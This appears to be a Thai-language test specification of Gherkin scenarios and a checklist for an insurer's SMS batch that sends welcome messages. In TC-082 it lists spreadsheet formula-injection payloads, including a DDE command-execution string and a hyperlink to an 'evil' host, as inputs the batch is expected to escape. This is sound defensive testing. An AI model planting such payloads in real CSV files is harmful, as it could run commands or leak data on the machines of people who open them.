    Given บันทึก snapshot (checksum + row count + updated_date สูงสุด) ของตาราง "<table>" ก่อน batch รัน
    When batch รันครบรอบ (ทั้งกรณีสำเร็จและกรณีหยุดรอบกลางคัน)
    Then snapshot ของ "<table>" หลังรันเหมือนเดิมทุกประการ
    And ไม่มี INSERT / UPDATE / DELETE เกิดขึ้นกับตารางนั้นจาก service account ของ batch

    Examples:
      | table                       |
      | ili_application_osp_ord     |
      | ili_application_osp_ind     |
      | ili_application_osp_pa      |
      | ili_policy_master           |
      | ili_customer_data_analytics |
      | ili_policy_remark           |
      | cf_catalog                  |
      | sms_message_schedule        |
      | SMS_CATEGORY                |
```

```gherkin
# Covers: FR-020, FR-015, FR-016, EC-004
Feature: TC-073 Manual Fix — No Duplicate Log Rows
  Scenario: Manual Fix ไม่สร้าง log ซ้ำสำหรับรายการที่ส่งแล้ว
    Given ช่วงวันที่ "2026-05-15" เคยรันแล้วและมี 3 รายการที่ sent_status='S'
    And CSMS_LOG มี 3 row สำหรับรายการเหล่านั้น
    When IT Admin สั่ง Manual Batch ช่วงวันที่เดียวกันซ้ำอีก 2 ครั้ง
    Then จำนวน row ใน CSMS_LOG สำหรับ 3 รายการนั้นยังคงเป็น 3 (ไม่เพิ่ม)
    And จำนวน row ที่ sent_status='S' ใน WELCOME_NEW_CUST_LINE ของ key เดิมยังคงเป็น 3
    And credit_amount รวมของรอบไม่ถูกนับซ้ำ (ไม่เกิดค่าใช้จ่ายซ้ำซ้อน)
```

---

### Dimension 7 — UX/Usability

> **หมายเหตุขอบเขต**: feature นี้เป็น **headless batch** ไม่มี UI สำหรับลูกค้า — ดังนั้น UX/Usability จึง map ไปยัง **admin/ops surfaces 3 จุดที่มีจริง**: (1) email แจ้งเตือน (FR-018), (2) หน้า Manual Fix ของ Admin Dashboard (FR-019), (3) รายงานประจำวัน (FR-021)
> **ยกเว้นเฉพาะส่วน** (พร้อมเหตุผล): **WCAG AA / responsive-mobile** — ทั้ง Manual Fix และรายงานใช้หน้าจอกลางเดิมของ CSMS ที่อยู่นอก scope ของ feature นี้ (Q-004 Closed: "ไม่ออกแบบ UI ใหม่ เพียงเพิ่ม batch เข้า list") ⇒ accessibility ของหน้าจอกลางเป็นความรับผิดชอบของ owner หน้าจอเดิม ไม่ใช่ของ feature 002

```gherkin
# Covers: FR-018, MSG-001, SC-004
Feature: TC-074 Alert Email Readability
  Scenario: Email แจ้งเตือนอ่านเข้าใจได้และดำเนินการต่อได้ทันที
    Given รอบวันที่ "2026-05-15" ล้มเหลวที่ขั้นตอน "Line Connect API down"
    When ระบบส่ง Email แจ้งเตือนทีม IT และ User
    Then subject ของ email ระบุได้ทันทีว่าเป็น batch ใดและล้มเหลว (ตาม convention เดิมของ CSMS)
    And เนื้อหาระบุชื่อ batch = "BATCH-CSMS-WELCOME-LINE" อย่างชัดเจน
    And เนื้อหาระบุ **ขั้นตอนที่ล้มเหลว** ไม่ใช่แค่ "batch failed" ลอย ๆ
    And เนื้อหาระบุ **วันที่ของรอบ** ที่ล้มเหลว เพื่อให้ IT Admin นำไปกรอกใน Manual Fix ได้ตรง
    And ข้อความภาษาไทยใน email ไม่เป็น mojibake (encoding ถูกต้อง)
    And email ไม่มี stack trace ดิบหรือ PII ของลูกค้า (ดู TC-060)
    And ผู้รับ (IT + User) ตรงตาม distribution list มาตรฐานของ batch CSMS เดิม
```

```gherkin
# Covers: FR-019, MSG-004, Q-004
Feature: TC-075 Manual Fix Surface Usability
  Scenario: หน้า Manual Fix — ค้นหา batch ได้ ใช้งานได้ และได้ feedback
    Given IT Admin เปิดหน้า Manual Fix ของ Admin Dashboard กลาง CSMS
    Then batch "BATCH-CSMS-WELCOME-LINE" ปรากฏใน list ของหน้าเดิม พร้อมชื่อที่สื่อความหมาย
    And รูปแบบ/ตำแหน่งของ field วันที่เหมือนกับ batch อื่นในหน้าเดียวกัน (ไม่มี UI ใหม่ — Q-004)
    When IT Admin กรอกช่วงวันที่ไม่ถูกต้องแล้วกด Manual Batch
    Then ข้อความ validation ปรากฏใกล้ field ที่ผิด และใช้ข้อความมาตรฐานของหน้าจอกลางเดิม
    And ค่าที่กรอกไว้ไม่ถูกล้างทิ้ง (ผู้ใช้ไม่ต้องกรอกใหม่ทั้งหมด)
    When IT Admin กรอกช่วงวันที่ถูกต้องแล้วกด Manual Batch
    Then ระบบแสดง feedback ว่ารอบเริ่มทำงานแล้ว (ไม่ใช่เงียบ — ผู้ใช้ต้องไม่กดซ้ำเพราะไม่แน่ใจ ดู TC-058)
    And ปุ่ม Manual Batch ถูก disable ระหว่างรอผลเพื่อกัน double-submit
```

```gherkin
# Covers: FR-021, Q-006
Feature: TC-076 Daily Report Usability
  Scenario Outline: รายงานในสถานะ "<state>" → <expected>
    Given ผู้ใช้ฝ่ายธุรกิจเรียกดูรายงานของวันที่หนึ่ง
    And ข้อมูลของวันนั้นอยู่ในสถานะ "<state>"
    Then รายงาน "<expected>"

    Examples:
      | state                          | expected                                                        |
      | มีข้อมูลปกติ                   | แสดงยอดครบ + breakdown ORD/IND/PA + เหตุผลการตัดออกครบ 4 เหตุ    |
      | ไม่มีข้อมูลเลย (0 รายการ)      | แสดง empty state ที่เข้าใจได้ ไม่ใช่หน้าเปล่า/error (ดู TC-053)  |
      | รอบยังไม่รัน (วันอนาคต)        | แสดงข้อความว่ายังไม่มีข้อมูล ไม่ใช่ยอด 0 ที่ชวนเข้าใจผิด         |
      | มีรายการ 'F' สัดส่วนสูงผิดปกติ | ยอด 'F' มองเห็นชัดในรายงาน (เป็นช่องทาง**เดียว**ในการติดตาม — ไม่มี threshold alert) |
      | ชื่อลูกค้า/ค่ายาวผิดปกติ       | ไม่ทำให้ layout ล้นหรือตารางแตก (word-wrap / truncate พร้อม tooltip) |
    And ตัวเลขในรายงาน reconcile กับ WELCOME_NEW_CUST_LINE ได้ (SC-007 — ดู TC-071)
```

---

### ⚠️ Disputed Set A — `@disputed @csv-path` (TC-077 … TC-083)

> **ชุดนี้ตั้งอยู่บนสมมติฐานว่า `spec.md` FR-013 ชนะ** (ต้องสร้างไฟล์ CSV ก่อนเรียกบริการส่ง)
> **ห้าม execute พร้อมกับ Disputed Set B** — เมื่อ SA/PO ตัดสินแล้ว **ชุดใดชุดหนึ่งต้องถูกลบทิ้งทั้งชุด**
> หาก plan.md (API-path) ชนะ ⇒ **ลบ TC-077 … TC-083 ทั้งหมด** และถอน/แก้ FR-013 ใน spec.md

```gherkin
# Covers: FR-013, BR-007, Q-007
Feature: TC-077 CSV File Creation  @disputed @csv-path
  Scenario: สร้างไฟล์ Interface CSV ก่อนเรียกบริการส่ง
    Given รอบประมวลผลวันที่ "2026-05-16" มีรายการพร้อมส่ง 3 รายการ
    And interface directory ว่างเปล่าก่อน batch รัน
    When batch ประมวลผลถึงขั้นตอนสร้างไฟล์
    Then มีไฟล์ CSV 1 ไฟล์ถูกสร้างขึ้นใน interface directory
    And ไฟล์ถูกสร้าง **ก่อน** การเรียกบริการส่ง (ลำดับ: create file → call service)
    And ไฟล์มี 3 record ตรงกับจำนวนรายการที่พร้อมส่ง
    # ⚠ F-001: plan.md ไม่มีขั้นตอนนี้เลย — ถ้า plan ชนะ TC นี้จะกลายเป็น dead test ทันที
```

```gherkin
# Covers: FR-013, BR-007
Feature: TC-078 CSV UTF-8 Encoding  @disputed @csv-path
  Scenario Outline: ไฟล์ CSV encoding UTF-8 — "<content>" ไม่เพี้ยน
    Given รายการที่พร้อมส่งมีข้อมูล "<content>"
    When batch สร้างไฟล์ CSV
    Then ไฟล์ถูกเขียนด้วย encoding UTF-8
    And เมื่ออ่านไฟล์กลับด้วย UTF-8 ค่าที่ได้ตรงกับ "<content>" ทุกตัวอักษร
    And ไม่มี mojibake / "?" / กล่องสี่เหลี่ยม แทนที่อักขระไทย

    Examples:
      | content                                              |
      | ชื่อไทย "สมชาย ใจดี"                                  |
      | ข้อความเต็ม "เรียน คุณสมชาย OCEAN LIFE ไทยสมุทร..."   |
      | ชื่อที่มีสระ/วรรณยุกต์ซ้อน "ก้ำกึ่ง"                  |
      | คำนำหน้า "นาย" / "นาง" / "นางสาว"                     |
    And [NEEDS CLARIFICATION] spec ไม่ระบุว่าต้องมี BOM หรือไม่ — ระบบปลายทางอ่านได้ทั้ง 2 แบบหรือไม่?
```

```gherkin
# Covers: FR-013, BR-007, Q-007
Feature: TC-079 CSV Naming Convention  @disputed @csv-path
  Scenario Outline: ชื่อไฟล์ตาม [Department]_[SystemCode]_[Category]_[YYMMDDhhmmss].csv
    Given วันเวลาที่ batch สร้างไฟล์คือ "<run_datetime>" (ค.ศ.)
    And Department = "MKT", SystemCode = "CSMS"
    And SMS_CATEGORY code "113" มี sms_category_name_abbr = "MKTWelcomeNewCust"
    When batch สร้างไฟล์ CSV
    Then ชื่อไฟล์ที่ได้ = "<expected_filename>"
    And ส่วน YY เป็นปี **พ.ศ. 2 หลัก** (ค.ศ. + 543)

    Examples:
      | run_datetime        | expected_filename                              |
      | 2026-05-16 10:00:00 | MKT_CSMS_MKTWelcomeNewCust_260516100000.csv    |
      | 2026-01-01 10:00:00 | MKT_CSMS_MKTWelcomeNewCust_260101100000.csv    |
      | 2026-12-31 23:59:59 | MKT_CSMS_MKTWelcomeNewCust_261231235959.csv    |
      | 2057-05-16 10:00:00 | MKT_CSMS_MKTWelcomeNewCust_005016100000.csv    |
    # ตรวจสอบการแปลงปี: ค.ศ. 2026 = พ.ศ. 2569 → 2 หลักท้าย = "69"?  แต่ตัวอย่างใน spec.md
    #   คือ "260516100000" ซึ่ง "26" = ค.ศ. 2026 ไม่ใช่ พ.ศ. 2569
    # ⚠ **ข้อขัดแย้งภายใน FR-013 เอง**: ข้อความระบุ "วันที่เป็นปี พ.ศ. 2 หลัก" แต่ตัวอย่างไฟล์
    #   `MKT_CSMS_MKTWelcomeNewCust_260516100000.csv` (spec.md §US1 Example Data + FR-013)
    #   ใช้ "26" = ค.ศ. — ถ้าเป็น พ.ศ. ต้องเป็น "69" (2569)
    #   ⇒ **finding เพิ่มเติม (F-009)** — route ไป /speckit-analyze; แถว 2057 ข้างต้นเป็น boundary
    #   ที่พิสูจน์ว่าสองการตีความให้ผลต่างกัน — ต้องให้ SA ตัดสินก่อน execute
```

```gherkin
# Covers: FR-013, FR-016, BR-007
Feature: TC-080 CSV Column Order & Content  @disputed @csv-path
  Scenario: ลำดับและเนื้อหาคอลัมน์ในไฟล์ CSV ตรงตามที่กำหนด
    Given รายการที่พร้อมส่งคือกรมธรรม์ "2445901" ของ "สมชาย ใจดี" เบอร์ "0845012341"
    When batch สร้างไฟล์ CSV
    Then แต่ละ record มีคอลัมน์ครบและเรียงตามลำดับที่กำหนด
    And ค่าที่มี comma ถูก quote อย่างถูกต้อง (ไม่ทำให้คอลัมน์เลื่อน)
    And ค่าที่มี double-quote ถูก escape ตามมาตรฐาน CSV (RFC 4180)
    And ค่าที่มี newline ในข้อความ SMS ถูกจัดการโดยไม่ทำให้ record แตก
    # ⚠ **F-010 — spec ไม่ระบุ column list / column order ของไฟล์ CSV เลย**
    #   FR-013 ระบุเพียง encoding + naming convention เท่านั้น ไม่มี layout spec
    #   ⇒ TC นี้ **execute ไม่ได้** จนกว่า SA จะระบุ column contract
    #   ⇒ ถ้า CSV-path ชนะ นี่เป็น requirement gap ที่ต้องปิดทันที (ระบบปลายทางอ่านไฟล์ตาม layout ใด?)
```

```gherkin
# Covers: FR-013, FR-018, SC-004, BR-008
Feature: TC-081 CSV Generation Failure → Alert  @disputed @csv-path
  Scenario Outline: generate ไฟล์ไม่สำเร็จเพราะ "<cause>" → หยุดรอบ + email
    Given รอบประมวลผลวันที่ "2026-05-15" มีรายการพร้อมส่ง 5 รายการ
    And เกิดสภาวะ "<cause>" ที่ทำให้สร้างไฟล์ CSV ไม่สำเร็จ
    When batch พยายามสร้างไฟล์
    Then ระบบตรวจพบความล้มเหลว
    And ระบบ MUST NOT เรียกบริการส่ง (ไม่มี SMS ถูกส่งเลยในรอบนั้น — เพราะไฟล์ต้องมาก่อน)
    And ระบบส่ง Email แจ้งเตือนทีม IT และ User (FR-018) ระบุ batch = "BATCH-CSMS-WELCOME-LINE"
    And email ระบุขั้นตอนที่ล้มเหลว = "generate ไฟล์ไม่ได้"
    And IT Admin สามารถซ่อมย้อนหลังผ่าน Manual Fix ได้ (spec.md US2 Acceptance #1, #2)

    Examples:
      | cause                                 |
      | disk เต็ม (no space left)             |
      | ไม่มีสิทธิ์เขียนใน interface directory |
      | interface directory ไม่มีอยู่          |
      | ไฟล์ชื่อเดียวกันมีอยู่แล้วและถูก lock  |
      | สร้างไฟล์ไม่เสร็จตามเวลาที่กำหนด (timeout/SLA) |
    # ⚠ F-007: "ตามเวลาที่กำหนด" ไม่มีตัวเลข (checklist CHK004/CHK011 / G3) — แถวสุดท้าย assert ไม่ได้
```

```gherkin
# Covers: FR-013, Security
Feature: TC-082 CSV Formula Injection  @disputed @csv-path
  Scenario Outline: fname = "<value>" (<label>) → ต้อง escape ไม่ execute
    Given ข้อมูลลูกค้ามี fname = "<value>" (มาจาก ili_customer_data_analytics ที่ batch ไม่ควบคุมคุณภาพ)
    And ลูกค้ารายนั้นเข้าเงื่อนไขส่ง SMS
    When batch เขียนค่าลงไฟล์ CSV
    Then ค่าในไฟล์ถูก escape (นำหน้าด้วย ' หรือ quote) เพื่อไม่ให้ถูกตีความเป็นสูตร
    And เมื่อเปิดไฟล์ด้วย Excel / LibreOffice ค่าที่แสดงคือ literal ไม่ใช่ผลลัพธ์ของสูตร
    And ไม่มีการเรียก external reference / command ใด ๆ จากการเปิดไฟล์

    Examples:
      | value                          | label                    |
      | =1+1                           | สูตรพื้นฐาน              |
      | =cmd\|'/c calc'!A1             | DDE command execution    |
      | +1+1                           | นำหน้าด้วย +             |
      | -1+1                           | นำหน้าด้วย -             |
      | @SUM(A1:A9)                    | นำหน้าด้วย @             |
      | =HYPERLINK("http://evil","x")  | hyperlink injection      |
      | สมชาย,ใจดี                     | comma ในค่า (ต้อง quote) |
      | สมชาย"ใจดี                     | double-quote ในค่า       |
    # ⚠ spec ไม่มี requirement ด้าน CSV escaping/sanitization — ค่าคาดหวังอ้างจาก OWASP
    #   ⇒ ผูกกับ F-002 (ไม่มี security NFR); ต้องให้ SA ยืนยันก่อน execute
```

```gherkin
# Covers: FR-013, PDPA, Constitution IV
Feature: TC-083 CSV PII at Rest  @disputed @csv-path @spec_gap
  Scenario: ไฟล์ CSV มีชื่อ + เบอร์ลูกค้า — ต้องมีมาตรการป้องกัน
    Given batch สร้างไฟล์ "MKT_CSMS_MKTWelcomeNewCust_260516100000.csv" ที่มี fname, lname, mobile_no ของลูกค้าทุกรายในรอบ
    When ตรวจสอบมาตรการป้องกันไฟล์
    Then ไฟล์ต้องมี permission จำกัด (ไม่ใช่ world-readable — เช่น 0640 เจ้าของ service account)
    And interface directory ต้องไม่เข้าถึงได้จาก web / share สาธารณะ
    And ต้องมี retention policy — ระบุว่าไฟล์ถูกลบ/ย้าย/archive เมื่อใด
    And ต้องระบุได้ว่ามีการเข้ารหัสไฟล์ at rest หรือไม่ และถ้าไม่ ใครรับความเสี่ยง
    And หากไฟล์ถูกส่งต่อไปยังระบบอื่น ช่องทางต้องเข้ารหัส (SFTP/TLS ไม่ใช่ FTP/plain)
    # ⚠ **F-002 — CRITICAL** — นี่คือ Gap G2 ของ checklist.md ตรงตัว:
    #   CHK026 `[!]` "มี NFR ด้าน security/PII (การส่งเบอร์โทร+ชื่อลูกค้าในไฟล์ CSV, การเข้ารหัส,
    #   การเข้าถึงไฟล์) หรือไม่? [Gap — ไม่มี security/PII NFR เลย]"
    #   ⇒ TC นี้ **execute ไม่ได้** จนกว่าจะมี NFR ที่ SA/DPO รับรอง
    #   ⇒ หาก CSV-path ชนะ นี่คือ blocker ระดับ CRITICAL ต่อ SIT/Production
```

---

### ⚠️ Disputed Set B — `@disputed @api-path` (TC-084 … TC-088)

> **ชุดนี้ตั้งอยู่บนสมมติฐานว่า `plan.md` ชนะ** (ไม่มี CSV — ส่งทีละรายการผ่าน SMS Gateway V3 `sendSmsOtp`, 1 record = 1 HTTP call)
> **ห้าม execute พร้อมกับ Disputed Set A** — เมื่อ SA/PO ตัดสินแล้ว **ชุดใดชุดหนึ่งต้องถูกลบทิ้งทั้งชุด**
> หาก spec.md FR-013 (CSV-path) ชนะ ⇒ **ลบ TC-084 … TC-088 ทั้งหมด** และ plan.md ต้องถูกแก้ให้มีขั้นตอนสร้างไฟล์

```gherkin
# Covers: FR-014, POST-001
Feature: TC-084 Per-record sendSmsOtp Call  @disputed @api-path
  Scenario: เรียก SMS Gateway V3 `sendSmsOtp` 1 HTTP call ต่อ 1 รายการ
    Given รอบประมวลผลมีรายการพร้อมส่ง 3 รายการ
    And plan.md ระบุว่า SMS Gateway V3 (Infobip) ไม่มี bulk/template mechanism
    When batch ส่ง SMS ทั้งรอบ
    Then มีการเรียก `sendSmsOtp` ผ่าน `SmsGatewayMessageV3ESBService` ทั้งหมด 3 ครั้ง (1 call ต่อ 1 record)
    And ทุก call มี `mappedSystemName` = "CSMS_SNC_NewCust"
    And ทุก call มีข้อความที่ **render เสร็จสมบูรณ์แล้วฝั่ง epirusapp** (pre-render — ไม่มี variable ดิบส่งไป ESB)
    And ทุก call มีเบอร์ปลายทางของ record นั้น ๆ ตรงกับ mobile_no ในฐานข้อมูล
    # ⚠ F-001: spec.md FR-013 บังคับให้มีไฟล์ CSV ก่อน — ถ้า spec ชนะ TC นี้จะกลายเป็น dead test
```

```gherkin
# Covers: FR-014, FR-015, POST-002
Feature: TC-085 Per-call Response & refer_no  @disputed @api-path
  Scenario: เก็บ response / refer_no รายรายการจากแต่ละ HTTP call
    Given รอบประมวลผลมีรายการพร้อมส่ง 3 รายการ
    And SMS Gateway V3 ตอบกลับ refer_no ที่ต่างกันสำหรับแต่ละ call
      | record | refer_no             |
      | 1      | RF20260516100000001  |
      | 2      | RF20260516100000002  |
      | 3      | RF20260516100000003  |
    When batch ส่งและบันทึกผล
    Then แต่ละรายการมี CSMS_LOG row ของตัวเองพร้อม refer_no ที่ตรงกับ response ของ call นั้น
    And refer_no ของ record 1 MUST NOT ถูกนำไปบันทึกให้ record 2 หรือ 3 (ไม่สลับ/ไม่ใช้ค่าร่วม)
    And สถานะการส่งที่บันทึกเป็นของ call นั้น ๆ รายตัว ไม่ใช่สถานะรวมของรอบ
```

```gherkin
# Covers: FR-014, FR-016a
Feature: TC-086 Per-call Failure Handling  @disputed @api-path
  Scenario Outline: HTTP call ของ record ที่ 2 ล้มเหลวด้วย "<failure>" → record นั้น 'F' รอบเดินต่อ
    Given รอบประมวลผลมีรายการพร้อมส่ง 5 รายการ
    And การเรียก `sendSmsOtp` สำหรับ record ที่ 2 ล้มเหลวด้วย "<failure>"
    And การเรียกของ record อื่นสำเร็จปกติ
    When batch ส่ง SMS ทั้งรอบ
    Then record ที่ 2 ถูกบันทึก sent_status='F' และ sms_sent_date IS NULL (FR-016a)
    And record ที่ 1, 3, 4, 5 ถูกบันทึก sent_status='S'
    And รอบประมวลผลไม่หยุด (ความล้มเหลวรายรายการ ≠ ความล้มเหลวระดับรอบ)
    And ไม่มี email แจ้งเตือนระดับรอบถูกส่ง
    And record ที่ 2 ซ่อมได้ผ่าน Manual Fix เท่านั้น (FR-020b — daily ไม่ retry อัตโนมัติ)

    Examples:
      | failure               |
      | HTTP 500              |
      | HTTP 503              |
      | connection timeout    |
      | read timeout          |
      | response ไม่มี refer_no |
    # ⚠ F-006 (checklist CHK024 / G5): spec ไม่มี edge case/FR รองรับความล้มเหลวรายรายการของ Gateway
    #   ⇒ เกณฑ์แยก "รายรายการล้มเหลว" vs "ESB/Gateway ล่มทั้งระบบ (FR-018 → หยุดรอบ)" ไม่ชัด
    #   เช่น ถ้า 5/5 records ได้ HTTP 503 = ล่มทั้งระบบหรือรายรายการ 5 ครั้ง? ต้องให้ SA ระบุ threshold
```

```gherkin
# Covers: FR-013, FR-014
Feature: TC-087 No CSV File Produced  @disputed @api-path
  Scenario: ยืนยันว่าไม่มีการสร้างไฟล์ CSV ใด ๆ
    Given interface directory ว่างเปล่าก่อน batch รัน
    When batch รันครบรอบและส่ง SMS สำเร็จทุกรายการ
    Then interface directory ยังคงว่างเปล่า — ไม่มีไฟล์ *.csv ถูกสร้าง
    And ไม่มีไฟล์ชั่วคราว (.tmp / .part) หลงเหลือ
    And ไม่มีการเขียนไฟล์ใด ๆ ลง filesystem จากขั้นตอนส่ง SMS
    # ⚠ **นี่คือ TC ที่ขัดกับ spec.md FR-013 โดยตรง** — เป็นการ assert "ความไม่มี" ของสิ่งที่ spec บังคับ
    #   ถ้า spec.md FR-013 ชนะ TC นี้จะ **ผิดโดยนิยาม** และต้องถูกลบพร้อม Set B ทั้งชุด
    #   TC นี้ทำหน้าที่เป็น "canary" ที่พิสูจน์ว่าข้อขัดแย้ง F-001 ยังไม่ถูกตัดสิน
```

```gherkin
# Covers: FR-014, FR-001, SC-001
Feature: TC-088 Loop Throughput  @disputed @api-path @spec_gap
  Scenario Outline: N = <count> รายการ → <count> HTTP call ในรอบ 10:00
    Given รอบประมวลผลมีรายการพร้อมส่ง "<count>" รายการ
    And SMS Gateway V3 ส่งได้ทีละ 1 รายการต่อ 1 HTTP call (ไม่มี bulk — plan.md §Performance Goals)
    When batch รันรอบเวลา 10:00 น.
    Then มีการเรียก `sendSmsOtp` ทั้งหมด "<count>" ครั้ง
    And ทุกรายการถูกส่งครบไม่มีตกหล่น (SC-001 = 100%)
    And เวลาประมวลผลรวมของรอบ = "<elapsed>"

    Examples:
      | count  | elapsed                    |
      | 1      | [ไม่มีเกณฑ์]               |
      | 100    | [ไม่มีเกณฑ์]               |
      | 1000   | [ไม่มีเกณฑ์]               |
      | 10000  | [ไม่มีเกณฑ์]               |
    # ⚠ **F-005 — TC นี้ไม่มีเกณฑ์ผ่าน/ตก**:
    #   (1) checklist G1/CHK019/CHK025: "ไม่มี performance NFR (เวลาเสร็จต่อรอบ/จำนวน record สูงสุด)"
    #   (2) checklist G4/CHK007: "ไม่ระบุ volume ต่อรอบ"
    #   (3) plan.md §Performance Goals ระบุเองว่าเป็น "ข้อกังวลสำคัญ" + [NEEDS CLARIFICATION]
    #   ⇒ วัดได้ (measure) แต่ตัดสินไม่ได้ (assert) — ต้องให้ SA/PO ระบุ SLA + volume ก่อน execute
    #   ⇒ เกี่ยวโยง TC-057 (round overlap): ถ้ารอบใช้เวลาเกิน 24 ชม. จะเกิดการทับซ้อนของรอบ
```

---

## Test Checklist

**System** = `Centralized SMS (CSMS) — epirusapp / Ocean Life Web Portal` (คงที่ทุกแถว)
**Feature** = `CSMS-001 Batch ส่ง SMS Welcome New Customer (LINE)` (คงที่ทุกแถว)
**Test Status** = `Not Run` ทุกแถว · `Tested By` / `Tested Date` เว้นว่าง — ยังไม่มีระบบให้รัน (no code / no running app) · `Redmine No.` = `-` (ยังไม่มี Task/Defect number)

| Test Checklist ID | System | Feature | Screen | Sub Category | Test Objective | Test Condition | Test Step | Expected Result | Test Data | Priority | Test Status | Tested By | Tested Date (YYYY-MM-DD) | Redmine No. | Remark |
|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|---|
| TC-001 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Scheduler | Batch รันอัตโนมัติ 10:00 น. | batch ถูก register เป็น Camel scheduled bean | 1. ตั้งเวลา server เป็น 09:59:50 2. รอถึง 10:00:00 3. ตรวจ log การเริ่มรอบ | batch เริ่มทำงานอัตโนมัติเวลา 10:00:00 ไม่รันซ้ำในวันเดียวกัน | run_date=2026-05-14, TZ=Asia/Bangkok | P1 | Not Run |  |  | - | FR-001 · TD-001 |
| TC-002 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | ดึง ORD/IND/PA ที่ T-1 + Inforce | มีกรมธรรม์ 3 ประเภท issue_date=T-1 สถานะ Inforce | 1. seed กรมธรรม์ 3 ประเภท 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | กรมธรรม์ทั้ง 3 ปรากฏในกลุ่มเป้าหมาย ดึงจาก ili_application_osp_* | 2445901/ORD, 3110002/IND, 4220003/PA · issue_date=2026-05-13 | P1 | Not Run |  |  | - | FR-002 · Scenario Outline 3 rows |
| TC-003 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | กรมธรรม์ปี 2026+ ถูกดึง | issue_date=T-1 ปี 2026 สถานะ Inforce | 1. seed กรมธรรม์ปี 2026 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | กรมธรรม์ปรากฏในกลุ่มเป้าหมาย | 2445901, issue_date=2026-05-13 | P1 | Not Run |  |  | - | FR-003, A-006 |
| TC-004 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Data Selection | รายการที่มี mobile_no ถูกดึง | กรมธรรม์เข้าเงื่อนไข + มีเบอร์ | 1. seed mobile_no=0845012341 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | กรมธรรม์ปรากฏในกลุ่มเป้าหมาย | mobile_no=0845012341 | P1 | Not Run |  |  | - | FR-004, EC-001 |
| TC-005 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Exclusion | ไม่อยู่ใน DNC → ผ่าน | ili_policy_remark ไม่มี row ที่ตรงกัน | 1. ตรวจว่าไม่มี remark 2. รัน batch 3. ตรวจกลุ่มเป้าหมาย | กรมธรรม์ยังอยู่ในกลุ่มเป้าหมาย | 2445901, policy_type='O', ไม่มี remark_code='1' | P1 | Not Run |  |  | - | FR-005, BR-002 |
| TC-006 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Eligibility | เงื่อนไข 1 — ไม่พบ LINE + ไม่พบ Ocean Club → ส่ง | ผ่าน DNC แล้ว | 1. mock Line Connect ตอบ E02/LINE + E02/APP 2. รัน batch 3. ตรวจ eligibility | เข้าเกณฑ์ส่ง SMS ตาม BR-003 เงื่อนไข 1 | card_no=1409900111222, code=E02 ทั้ง 2 channel | P1 | Not Run |  |  | - | FR-006, FR-007, SC-002 |
| TC-007 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Eligibility | เงื่อนไข 2 — บล็อก LINE + ไม่มี Ocean Club → ส่ง | ผ่าน DNC แล้ว | 1. mock isBlockLine=true + APP=E02 2. รัน batch 3. ตรวจ eligibility | เข้าเกณฑ์ส่ง SMS ตาม BR-003 เงื่อนไข 2 | card_no=1409900111333, isBlockLine=true | P1 | Not Run |  |  | - | FR-006 · spec US1 Acceptance #4 |
| TC-008 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Eligibility | เงื่อนไข 3 — พบ LINE ไม่บล็อก / พบ Ocean Club → ไม่ส่ง | ผ่าน DNC แล้ว | 1. mock 3 ชุดผลลัพธ์ 2. รัน batch 3. ตรวจว่าไม่มีการเรียกส่ง | ไม่เข้าเกณฑ์ส่ง (ALT-001) ไม่มีการเรียกบริการส่ง | card_no=1409900111444/555/666 | P1 | Not Run |  |  | - | FR-006, SC-002 · Outline 3 rows |
| TC-009 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Eligibility | E02 ใช้ภายใน ไม่แสดงต่อผู้ใช้ | Line Connect ตอบ E02 | 1. mock code=E02 2. รัน batch 3. ตรวจ email/error output | ใช้ E02 ตัดสิน eligibility ไม่มี error ออกสู่ผู้ใช้ ไม่ใช่ failure ระดับรอบ | code=E02 | P2 | Not Run |  |  | - | FR-007, MSG-002 |
| TC-010 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Dedup | ซ้ำในรอบ → ส่ง 1 ครั้ง MIN(issue_date) | ลูกค้า 1 ราย มี 2 กรมธรรม์เข้าเงื่อนไข | 1. seed 2 กรมธรรม์ชื่อ-เบอร์เดียวกัน 2. รัน batch 3. นับ SMS | ส่ง 1 Transaction อ้างอิงกรมธรรม์ MIN(issue_date) | สมชาย/ใจดี/0845012341 · 2445901(05-13), 4220003(05-13) | P1 | Not Run |  |  | - | FR-009, BR-004, SC-003 · spec US1 #5 |
| TC-011 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Dedup | เคยส่งแล้ว → ตัดออก | WELCOME_NEW_CUST_LINE มีประวัติ sms_sent_date ไม่ว่าง | 1. seed ประวัติเดิม 2. รัน batch รอบถัดไป 3. ตรวจการส่ง | ตัดออก ไม่ส่งซ้ำ ไม่เรียกบริการส่ง | 2445901/ORD/สมชาย/ใจดี · sms_sent_date=2026-05-14 10:00:05 | P1 | Not Run |  |  | - | FR-010, BR-005, SC-003 · spec US1 #6 |
| TC-012 | Centralized SMS (CSMS) | CSMS-001 Welcome New Customer (LINE) | SMS Job (Batch) | Message | ใช้ template จาก sms_message_schedule ก่อน | มี template ทั้ง schedule และ SMS_CATEGORY | 1. seed template ทั้ง 2 แหล่ง 2. รัน batch 3. เทียบข้อความ | ข้อความสร้างจาก sms_message_schedule ไม่ใช้ SMS_CATEGORY | sms_category_code=113 | P1 | Not Run |  |  | - | FR-011, BR-006 |
